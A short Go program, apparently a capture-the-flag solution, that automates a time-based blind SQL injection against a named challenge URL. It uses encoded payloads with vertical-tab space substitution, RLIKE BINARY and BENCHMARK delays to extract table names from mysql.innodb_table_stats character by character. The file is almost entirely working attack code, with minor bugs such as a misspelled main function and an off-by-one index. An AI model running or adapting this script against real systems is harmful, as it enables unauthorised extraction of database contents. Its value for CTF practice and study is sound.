package main

import (
	"fmt"
	"net/http"
	"time"
)

func mian() {

	url := "http://80-57389f47-42cf-40ec-bd58-1baec67f0c99.challenge.ctfplus.cn/"
	dic := "ZXCVBNMLKJHGFDSAQWERTYUIOPabcdefghijklmnopqrstuvwxyz1234567890_{},-"
	var flag string
	for i := 1; i <= 500; i++ {
		for j := 1; j <= len(dic); j++ {
			char := dic[j]
			payload := fmt.Sprintf("username=1'%%26%%26if(substr((select%%0Bgroup_concat(table_name)%%0Bfrom%%0Bmysql.innodb_table_stats),%d,1)RLIKE%%0BBINARY'%%0B'%c',BENCHMARK(10000000,sha(1)),BENCHMARK(0,sha(1)))%%23", i, char)

			//构造url
			sqlUrl := url + "?" + payload

			startTime := time.Now()

			_, err := http.Get(sqlUrl)
			if err != nil {
				fmt.Println("请求失败:", err)
				return
			}

			endTime := time.Now()

			duration := endTime.Sub(startTime).Seconds()

			if duration > 3 {
				fmt.Println("时间差:", duration)
				flag += string(char)
				fmt.Println("当前flag", flag)
				break
			}
		}
	}
	fmt.Println("最终的flag", flag)

}
